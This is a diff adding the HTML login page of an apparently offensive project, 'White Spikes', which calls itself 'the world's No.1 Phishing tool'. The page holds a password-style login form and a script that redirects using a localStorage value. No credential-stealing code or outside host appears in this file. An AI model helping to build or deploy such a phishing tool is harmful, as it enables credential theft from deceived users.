@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>White Spikes LOGIN | Pishing Tool</title>
+    <link rel="stylesheet" href="./assets/css/main.css">
+    <link rel="stylesheet" href="./assets/css/login.css">
+    <script>
+        const url = localStorage.getItem('url')
+        if (url !== null) {
+            location.href = url
+        }
+    </script>
+</head>
+
+<body>
+
+    <form class="login" action="/" method="POST">
+        <h2>White Spikes login</h2>
+        <input type="password" name="username" placeholder="U53RN4M3" required>
+        <input type="password" name="password" placeholder="9455W0RD" required>
+        <input type="submit">
+        <p>the world's No.1 Phishing tool. created by <a href="https://github.com/madhanmaaz">madhan</a></p>
+    </form>
+
+</body>
+
+</html>
